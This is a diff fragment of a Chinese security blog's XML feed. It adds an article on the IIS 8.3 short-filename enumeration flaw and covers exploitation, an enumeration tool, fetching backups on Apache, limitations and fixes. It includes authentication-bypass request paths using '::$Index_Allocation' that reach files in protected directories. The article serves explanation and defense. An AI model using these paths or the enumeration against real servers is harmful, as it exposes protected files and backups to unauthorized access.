+<li>结合OWASP的 <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a> （一款路径及网页暴力破解的工具）。</li>
+</ol>
+<p>Github 上有研究人员已经用 python 将上述方法实现，并且获取到了网站后台的用户名和密码，很好的利用了 IIS 短文件漏洞。</p>
+<blockquote>
+<p>注： <br>研究报告地址：<a href="https://webbreacher.com/2014/10/23/tilde-enumeration/">https://webbreacher.com/2014/10/23/tilde-enumeration/</a> （推荐）<br>python 程序下载：<a href="https://github.com/WebBreacher/tilde_enum">https://github.com/WebBreacher/tilde_enum</a> （推荐）</p>
+</blockquote>
+<h4 id="2-结合支持短文件特性软件（Apache、Wordpress）"><a href="#2-结合支持短文件特性软件（Apache、Wordpress）" class="headerlink" title="2. 结合支持短文件特性软件（Apache、Wordpress）"></a>2. 结合支持短文件特性软件（Apache、Wordpress）</h4><p>Acunetix 研究指出当 Apache 运行在 windows 下，如果创建了一个长文件，那么无需猜解长文件，直接用短文件就可以下载了。例如一个 <code>backup_20180101.sql</code> 的长文件，其短文件是 <code>BACKUP~1.SQL</code>，攻击者只需要提交 <code>BACKUP~1.SQL</code> 就可以直接访问并下载该文件。</p>
+<p>此外，有学者表明，其在安装Wordpress备份插件之后，通过短文件名成功地访问到了了WordPress博客的备份文件。</p>
+<h4 id="3-绕过Basic-and-Windows认证"><a href="#3-绕过Basic-and-Windows认证" class="headerlink" title="3. 绕过Basic and Windows认证"></a>3. 绕过Basic and Windows认证</h4><p>Soroush Dalilide 研究中还提到，在某些 IIS 服务器配置下，可以绕过 Basic and Windows 认证，猜解出认证目录下的文件。举例，如果需要访问一个开启认证的目录下文件时，比如这个目录是 “AuthNeeded”，那么可以通过如下方式访问：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/AuthNeeded::$Index_Allocation/*~1*/.aspx</span><br><span class="line">或者</span><br><span class="line">/AuthNeeded:$I30:$Index_Allocation/*~1*/.aspx</span><br></pre></td></tr></table></figure>
+<h3 id="此漏洞存在以下几个局限点："><a href="#此漏洞存在以下几个局限点：" class="headerlink" title="此漏洞存在以下几个局限点："></a>此漏洞存在以下几个局限点：</h3><ol>
+<li>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</li>
+<li>如果文件名本身太短（无短文件名）也是无法猜解的；</li>
+<li>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</li>
+<li>如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报；</li>
+<li>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测。</li>
+</ol>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h4 id="通用漏洞修复方案"><a href="#通用漏洞修复方案" class="headerlink" title="通用漏洞修复方案"></a>通用漏洞修复方案</h4><p><strong>1. CMD关闭NTFS 8.3文件格式的支持</strong><br>举例：（1代表关闭，0代表开启）<br>Windows Server 2008 R2：<br>查询是否开启短文件名功能：fsutil 8dot3name query<br>关闭该功能：fsutil 8dot3name set 1<br>Windows Server 2003：<br>关闭该功能：fsutil behavior set disable8dot3 1<br>不同系统关闭命令稍有区别，该功能默认是开启的，对于大多数用户来说无需开启。</p>
+<p><strong>2. 修改注册表禁用短文件名功能</strong><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation 这一项的值设为 1，1代表不创建短文件名格式<br>修改完成后，需要重启系统生效</p>
+<blockquote>
+<p>注：此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除，需要重新复制才会消失。</p>
+</blockquote>
+<p><em>以下两种方法仅适用于缓解GET 方法，其他方法依旧可以猜解。</em><br><strong>3. 关闭Web服务扩展- ASP.NET</strong><br><strong>4. 升级netFramework至4.0以上版本</strong></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04-参考"></a>0x04-参考</h2><p>备份文件在特定环境下（apache）可被任意下载（利用windows短文件名）：<a href="http://www.jinglingshu.org/?p=6039%5C">http://www.jinglingshu.org/?p=6039\</a><br>IIS短文件名漏洞知识：<a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a></p>
+]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>目录猜解</category>
       </categories>
       <tags>
-        <tag>WEB安全</tag>
-        <tag>暴力破解</tag>
-        <tag>AES</tag>
+        <tag>渗透测试</tag>
+        <tag>短文件名</tag>
+        <tag>文件下载</tag>
+        <tag>目录猜解</tag>
       </tags>
   </entry>
   <entry>
